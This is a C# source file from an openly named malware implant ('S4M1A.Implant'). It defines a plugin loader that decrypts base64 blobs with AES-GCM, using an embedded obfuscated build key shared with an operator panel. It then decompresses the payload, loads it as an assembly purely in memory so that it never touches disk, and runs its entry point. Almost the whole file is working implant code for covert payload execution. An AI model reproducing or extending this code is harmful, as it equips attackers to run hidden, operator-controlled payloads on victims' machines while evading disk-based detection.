using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Text;

namespace S4M1A.Implant.Modules
{
    // =====================================================================
    //  S4M1A PluginLoader v2.0 - encrypted in-memory plugin system
    //
    //  Contract (used by Commands.cs):
    //    PluginLoader.LoadB64(string b64, string key) -> status string
    //
    //  Blob layout (plaintext, before compression/encryption):
    //    magic(8) "S4M1APL1" || iv(12) || ct || tag(16)     [AES-256-GCM]
    //  Plaintext = Deflate(assembly bytes) prefixed with 4-byte LE length.
    //  KEY: when key==null the build key is used - the same KEK the panel
    //  wraps everything with (see makeconfig.py / Crypto.UnwrapBuildKey).
    //
    //  Plugin contract (compiled against a console class lib):
    //    [S4M1APlugin("name", "1.0")]
    //    public static class Entry { public static string Run(string args); }
    //  Loaded via Assembly.Load(byte[]) - never touches disk, never needs
    //  registration. .NET Framework cannot unload assemblies, so reloading
    //  the same plugin returns the already-loaded instance (idempotent by
    //  assembly identity).
    // =====================================================================

    [AttributeUsage(AttributeTargets.Class)]
    public sealed class S4M1APluginAttribute : Attribute
    {
        public string Name { get; private set; }
        public string Version { get; private set; }

        public S4M1APluginAttribute(string name, string version)
        {
            Name = name;
            Version = version;
        }
    }

    public static class PluginLoader
    {
        private static readonly byte[] Magic = Encoding.ASCII.GetBytes("S4M1APL1");
        private const int MaxPluginBytes = 8 * 1024 * 1024; // 8 MB cap

        public static string LoadB64(string b64, string key)
        {
            try
            {
                if (string.IsNullOrEmpty(b64)) return "ERR: empty payload";

                byte[] blob = Convert.FromBase64String(b64);
                if (blob.Length < 8 + 12 + 16 + 5 || !MagicMatch(blob, 0))
                    return "ERR: bad plugin blob";

                byte[] kek;
                if (!string.IsNullOrEmpty(key))
                {
                    kek = Convert.FromBase64String(key);
                }
                else
                {
                    kek = Crypto.UnwrapBuildKey(EmbeddedKey.Obf, EmbeddedKey.BuildId);
                }
                if (kek == null || kek.Length != 32) return "ERR: no valid KEK";

                byte[] pt = Gcm.Decrypt(kek, Slice(blob, 8, 12),        // iv
                                        Slice(blob, 20, blob.Length - 36), // ct
                                        Slice(blob, blob.Length - 16, 16)); // tag
                if (pt == null) return "ERR: plugin auth/decrypt failed";

                if (pt.Length < 4) return "ERR: truncated plaintext";
                int len = BitConverter.ToInt32(pt, 0);
                if (len <= 0 || len > MaxPluginBytes || len > pt.Length - 4)
                    return "ERR: invalid plugin length";

                byte[] raw = DeflateDecompress(pt, 4, len);
                if (raw == null) return "ERR: decompress failed";

                return Load(raw);
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        // =====================================================================
        //  Assembly load + entry discovery
        // =====================================================================

        private static string Load(byte[] raw)
        {
            Assembly asm = Assembly.Load(raw);
            Type entry = null;
            MethodInfo entryRun = null;
            string name = asm.GetName().Name;
            string version = (asm.GetName().Version != null) ? asm.GetName().Version.ToString() : "0.0";

            foreach (Type t in SafeTypes(asm))
            {
                S4M1APluginAttribute attr =
                    (S4M1APluginAttribute)Attribute.GetCustomAttribute(t, typeof(S4M1APluginAttribute));
                if (attr != null)
                {
                    name = attr.Name;
                    version = attr.Version;
                }
                if (t.IsClass && t.IsAbstract && t.IsSealed) // static class
                {
                    MethodInfo run = t.GetMethod("Run",
                        BindingFlags.Public | BindingFlags.Static);
                    if (run != null &&
                        run.ReturnType == typeof(string) &&
                        run.GetParameters().Length == 1 &&
                        run.GetParameters()[0].ParameterType == typeof(string))
                    {
                        entry = t;
                        entryRun = run;
                        break;
                    }
                }
            }

            if (entry == null)
                return "ERR: no static Run(string) entry point found in "
                     + asm.GetName().Name;

            try
            {
                string result = (string)entryRun.Invoke(null, new object[] { "" });
                return "plugin loaded: " + name + " v" + version
                     + (string.IsNullOrEmpty(result) ? "" : " | " + result);
            }
            catch (TargetInvocationException tie)
            {
                return "ERR: plugin threw: " + (tie.InnerException != null ? tie.InnerException.Message : tie.Message);
            }
        }

        private static Type[] SafeTypes(Assembly asm)
        {
            try { return asm.GetTypes(); }
            catch (ReflectionTypeLoadException e) { return e.Types.Where(t => t != null).ToArray(); }
            catch { return Type.EmptyTypes; }
        }

        // =====================================================================
        //  Helpers
        // =====================================================================

        private static byte[] DeflateDecompress(byte[] src, int off, int len)
        {
            try
            {
                using (MemoryStream input = new MemoryStream(src, off, len))
                using (DeflateStream ds = new DeflateStream(input, CompressionMode.Decompress))
                using (MemoryStream output = new MemoryStream())
                {
                    ds.CopyTo(output);
                    return output.ToArray();
                }
            }
            catch { return null; }
        }

        private static bool MagicMatch(byte[] data, int off)
        {
            for (int i = 0; i < Magic.Length; i++)
                if (data[off + i] != Magic[i]) return false;
            return true;
        }

        private static byte[] Slice(byte[] src, int start, int count)
        {
            byte[] b = new byte[count];
            Buffer.BlockCopy(src, start, b, 0, count);
            return b;
        }
    }
}